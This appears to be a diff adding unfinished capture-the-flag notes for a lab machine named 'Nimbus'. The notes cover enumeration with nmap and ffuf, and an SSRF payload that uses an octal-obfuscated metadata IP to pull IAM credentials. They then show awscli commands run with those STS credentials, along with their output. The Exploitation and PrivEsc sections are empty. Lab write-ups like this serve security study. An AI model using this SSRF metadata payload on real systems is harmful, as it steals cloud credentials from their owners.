@@ -1,0 +1,59 @@
+[Profile]{
+Machine: Nimbus
+ip: 10.129.30.91
+OS: Linux
+}
+
+[Enumeration]{
+nmap -sC -sV -Pn 10.129.30.91
+  |- ssh and nginx
+we go see the http://nimbus.htb/ site and find some info
+http://nimbus.htb/api/v1/health
+  |-> endpoint : http://aws.nimbus.htb
+
+By running some vhost and discovery with ffuf, we discover 
+  aws.nimbus.htb ( which returns a 403 ) , po\197\161ta.nimbus.htb ( which returns a 400 )
+  nimbus.htb/login , nimbus.htb/jobs
+
+how about we inspect our api for other endpoints
+  we indeed find api/v1/health but also ?: which redirects to the site.
+
+  We try to connect to aws.nimbus.htb and to print a msg saying we need a security token, we also get a link on the site about STS ( sts.amazon...) which we look and it seems to be Security Token Service.
+
+  We look and it says it uses fleet, let's do some research on it.
+
+  We discover Fleet could leak sts credentials ( CVE-2026-22808 ). *You guess what it will be used for, right?
+
+---
+Just try SSRF on the url to get the STS 
+... ssrf payload: http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml which reveals aws sts (... secret key, token, expiration ) of type aws-hmac.
+
+Using the awscli, we get some information around:
+```bash
+aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
+{
+    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
+    "Account": "847219365028",
+    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
+}
+```
+``bash
+aws --endpoint-url http://aws.nimbus.htb sqs list-queues
+{
+    "QueueUrls": [
+        "http://floci:4566/847219365028/nimbus-jobs"
+    ]
+}
+```
+
+
+}
+
+[Exploitation]{
+
+}
+
+[PrivEsc]{
+
+
+}
